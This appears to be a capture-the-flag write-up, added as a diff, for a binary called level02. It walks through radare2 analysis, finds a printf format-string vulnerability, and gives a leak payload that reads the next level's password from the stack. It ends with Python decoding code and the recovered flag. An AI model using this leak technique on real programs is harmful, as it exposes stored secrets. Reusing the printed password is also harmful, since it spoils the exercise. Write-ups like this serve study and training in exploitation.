@@ -1,0 +1,52 @@
+-- Static Analysis --
+
+$ `r2 -A level02`
+
+- Check information -
+`i` `iS` `izz` `iI` `aflm`
+Info section, protection, strings, symbols, import, export, functions
+We see that nothing is protected, no strings are helpful, and only imported functions are here
+
+- Disassembly -
+`VV @ main` -> graph mode on the main
+We notice that the /bin/sh we want is at the end of the true branches on the jne instructions
+We also notice weird rep stosq instructions in the first code block
+since im too lazy to read the doc for stosq, lets use r2ghidra
+
+- Decompiling to verify first weird code block -
+`pdg @ main`
+the rep stosq are just assembly loop that act like memset would
+Back to assembly
+
+- Code flow -
+While following the true branch we understand that the code basically do 4 thing
+- memset a bunch
+- open level3/.pass and store it in a buffer on the stack
+- Ask username and password, both stored in buffer
+- Return a shell if password match .pass, otherwise display the user who asked doesnt have access
+
+- Vulnerability -
+The printf in the last false branch uses our input buffer as fmt
+So we can perform a read fmt vulnerability to display stack info
+And if you remenber correctly on the stack is currently stored level3/.pass in a read_buff
+So all we have to do now is mount the exploit to leak read_buff
+
+- Exploit -
+buff_read = rbp-0x70
+buff_user = rbp-0xa0
+
+It is a 64 bit executable so the memory cells are 8 bytes long, same for printf internals
+
+1. We fuzz the input to find our fmt buffer, its at the 28th position from the printf call
+2. The buffer containing our fmt is 48 byte below the buffer we're trying to leak, so 6 memory cell away
+3. The size of the fread is 40 byte, so 5 memory cell in length to read the full password
+%22$p.%23$p.%24$p.%25$p.%26$p
+
+- Quickly join the string as raw byte -
+pwntool locally ->
+p64(0x756E505234376848) + p64(0x45414A3561733951) + p64(0x377A7143574E6758) + p64(0x354A35686E475873) + p64(0x48336750664B394D)
+
+Or struct.pack so it works even on the vm ->
+struct.pack("<q", 0x756E505234376848) + struct.pack("<q", 0x45414A3561733951) + struct.pack("<q", 0x377A7143574E6758) + struct.pack("<q", 0x354A35686E475873) + struct.pack("<q", 0x48336750664B394D)
+
+Flag = Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
